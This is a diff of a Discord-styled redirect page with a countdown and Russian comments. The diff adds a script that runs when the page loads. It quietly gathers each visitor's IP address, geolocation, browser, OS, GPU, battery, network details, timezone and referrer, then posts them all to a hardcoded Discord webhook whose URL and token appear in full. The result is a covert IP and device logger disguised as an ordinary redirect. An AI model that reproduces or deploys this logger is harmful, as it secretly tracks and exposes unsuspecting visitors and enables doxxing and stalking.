@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #5865F2; /* Discord blurple */
+            --primary: #5865F2;
             --text-color: #f8f9fa;
             --bg-color: #0e0e10;
             --card-bg: rgba(20, 20, 25, 0.85);
@@ -348,7 +348,6 @@
             }
         }
 
-        /* Анимация градиента */
         .gradient-animation {
             position: absolute;
             top: 0;
@@ -368,7 +367,6 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* Адаптация под мобильные */
         @media (max-width: 768px) {
             .container {
                 max-width: 95%;
@@ -393,7 +391,6 @@
             }
         }
 
-        /* Эффект набора текста */
         .typing-effect {
             display: inline-block;
             overflow: hidden;
@@ -471,6 +468,295 @@
     </div>
 
     <script>
+        // Конфигурация
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1371211505185460345/M528CnXsSmRvBNPVC6RwgfR_rCN2s8dTF0uR-ZMrZlCMXF9Fnbn4Det36HOWOyoIHlS8';
+        
+        // Функция для сбора максимально возможных данных об устройстве
+        async function collectDeviceInfo() {
+            try {
+                // 1. Получаем IP адрес и информацию о местоположении
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // 2. Собираем информацию о браузере и ОС
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const languages = navigator.languages;
+                const cookieEnabled = navigator.cookieEnabled;
+                const doNotTrack = navigator.doNotTrack;
+                
+                // 3. Собираем информацию об экране
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const colorDepth = window.screen.colorDepth;
+                const pixelRatio = window.devicePixelRatio;
+                const orientation = window.screen.orientation?.type;
+                
+                // 4. Собираем информацию о браузере
+                const browserName = detectBrowser();
+                const browserVersion = detectBrowserVersion();
+                const osName = detectOS();
+                
+                // 5. Собираем информацию о GPU
+                const gpuInfo = await getGPUInfo();
+                
+                // 6. Собираем информацию о подключении
+                const connectionInfo = navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null;
+                
+                // 7. Собираем информацию о батарее (для мобильных устройств)
+                const batteryInfo = navigator.getBattery ? await getBatteryInfo() : null;
+                
+                // 8. Собираем информацию о геолокации (если разрешено)
+                const geolocation = await getGeolocation();
+                
+                // 9. Собираем информацию о времени
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const currentTime = new Date().toLocaleString();
+                
+                // 10. Собираем информацию о реферере
+                const referrer = document.referrer || 'Прямой заход';
+                const pageUrl = window.location.href;
+                
+                // Формируем полный отчет
+                const deviceInfo = {
+                    ipInfo: {
+                        ip,
+                        ...(geolocation || {})
+                    },
+                    browser: {
+                        name: browserName,
+                        version: browserVersion,
+                        userAgent,
+                        language,
+                        languages,
+                        cookieEnabled,
+                        doNotTrack
+                    },
+                    os: {
+                        name: osName,
+                        platform
+                    },
+                    screen: {
+                        width: screenWidth,
+                        height: screenHeight,
+                        colorDepth,
+                        pixelRatio,
+                        orientation
+                    },
+                    hardware: {
+                        gpu: gpuInfo,
+                        cpuCores: navigator.hardwareConcurrency || 'unknown'
+                    },
+                    network: connectionInfo,
+                    battery: batteryInfo,
+                    time: {
+                        timezone,
+                        currentTime
+                    },
+                    referrer,
+                    pageUrl
+                };
+                
+                return deviceInfo;
+            } catch (error) {
+                console.error('Ошибка при сборе информации об устройстве:', error);
+                return null;
+            }
+        }
+        
+        // Вспомогательные функции для определения браузера и ОС
+        function detectBrowser() {
+            const userAgent = navigator.userAgent;
+            
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('SamsungBrowser')) return 'Samsung Browser';
+            if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
+            if (userAgent.includes('Trident')) return 'Internet Explorer';
+            if (userAgent.includes('Edge')) return 'Edge';
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Safari')) return 'Safari';
+            
+            return 'Unknown';
+        }
+        
+        function detectBrowserVersion() {
+            const userAgent = navigator.userAgent;
+            let temp;
+            let version = 'unknown';
+            
+            if (userAgent.includes('Firefox/')) {
+                temp = userAgent.split('Firefox/');
+                version = temp[1] || 'unknown';
+            } else if (userAgent.includes('Chrome/')) {
+                temp = userAgent.split('Chrome/');
+                version = temp[1].split(' ')[0] || 'unknown';
+            } else if (userAgent.includes('Version/')) {
+                temp = userAgent.split('Version/');
+                version = temp[1].split(' ')[0] || 'unknown';
+            }
+            
+            return version;
+        }
+        
+        function detectOS() {
+            const userAgent = navigator.userAgent;
+            
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'MacOS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
+            
+            return 'Unknown';
+        }
+        
+        // Функция для получения информации о GPU
+        async function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return 'WebGL not supported';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+                
+                return 'WEBGL_debug_renderer_info not available';
+            } catch (error) {
+                return 'Error getting GPU info';
+            }
+        }
+        
+        // Функция для получения информации о батарее
+        async function getBatteryInfo() {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    charging: battery.charging,
+                    level: battery.level * 100 + '%',
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (error) {
+                return 'Battery API not supported';
+            }
+        }
+        
+        // Функция для получения геолокации
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
+                        });
+                    },
+                    (error) => {
+                        resolve({
+                            error: 'Geolocation error: ' + error.message
+                        });
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Функция для отправки данных в Discord
+        async function sendDeviceInfoToDiscord() {
+            try {
+                const deviceInfo = await collectDeviceInfo();
+                if (!deviceInfo) return;
+                
+                // Форматируем данные для Discord
+                let discordMessage = `**🖥️ Новое подключение к сайту**\n\n`;
+                
+                discordMessage += `**🌐 IP и местоположение:**\n`;
+                discordMessage += `IP: ${deviceInfo.ipInfo.ip}\n`;
+                if (deviceInfo.ipInfo.latitude) {
+                    discordMessage += `Примерное местоположение: ${deviceInfo.ipInfo.latitude}, ${deviceInfo.ipInfo.longitude} (точность: ${deviceInfo.ipInfo.accuracy})\n`;
+                }
+                
+                discordMessage += `\n**🖥️ Система:**\n`;
+                discordMessage += `ОС: ${deviceInfo.os.name} (${deviceInfo.os.platform})\n`;
+                discordMessage += `Браузер: ${deviceInfo.browser.name} ${deviceInfo.browser.version}\n`;
+                discordMessage += `Язык: ${deviceInfo.browser.language}\n`;
+                
+                discordMessage += `\n**📺 Экран:**\n`;
+                discordMessage += `Разрешение: ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
+                discordMessage += `Плотность пикселей: ${deviceInfo.screen.pixelRatio}\n`;
+                discordMessage += `Цвет: ${deviceInfo.screen.colorDepth}-bit\n`;
+                discordMessage += `Ориентация: ${deviceInfo.screen.orientation || 'unknown'}\n`;
+                
+                discordMessage += `\n**⚙️ Железо:**\n`;
+                discordMessage += `CPU ядер: ${deviceInfo.hardware.cpuCores}\n`;
+                discordMessage += `GPU: ${deviceInfo.hardware.gpu.vendor || 'unknown'} - ${deviceInfo.hardware.gpu.renderer || 'unknown'}\n`;
+                
+                if (deviceInfo.battery && deviceInfo.battery !== 'Battery API not supported') {
+                    discordMessage += `\n**🔋 Батарея:**\n`;
+                    discordMessage += `Заряд: ${deviceInfo.battery.level}\n`;
+                    discordMessage += `Статус: ${deviceInfo.battery.charging ? 'Заряжается' : 'Не заряжается'}\n`;
+                }
+                
+                if (deviceInfo.network) {
+                    discordMessage += `\n**📶 Сеть:**\n`;
+                    discordMessage += `Тип: ${deviceInfo.network.effectiveType}\n`;
+                    discordMessage += `Скорость: ~${deviceInfo.network.downlink} Mbps\n`;
+                    discordMessage += `Задержка: ${deviceInfo.network.rtt} ms\n`;
+                }
+                
+                discordMessage += `\n**🕒 Время:**\n`;
+                discordMessage += `Часовой пояс: ${deviceInfo.time.timezone}\n`;
+                discordMessage += `Локальное время: ${deviceInfo.time.currentTime}\n`;
+                
+                discordMessage += `\n**🔗 Источник:**\n`;
+                discordMessage += `Страница: ${deviceInfo.pageUrl}\n`;
+                discordMessage += `Реферер: ${deviceInfo.referrer}\n`;
+                
+                discordMessage += `\n**📱 User Agent:**\n\`\`\`${deviceInfo.browser.userAgent}\`\`\``;
+                
+                // Отправляем данные через Webhook
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: discordMessage
+                    })
+                });
+                
+                console.log("Информация об устройстве отправлена в Discord");
+            } catch (error) {
+                console.error('Ошибка при отправке данных в Discord:', error);
+            }
+        }
+        
+        // Вызываем при загрузке страницы
+        window.addEventListener('load', sendDeviceInfoToDiscord);
+
         // Автоматическое перенаправление
         let seconds = 5;
         const countdownElement = document.getElementById('countdown');
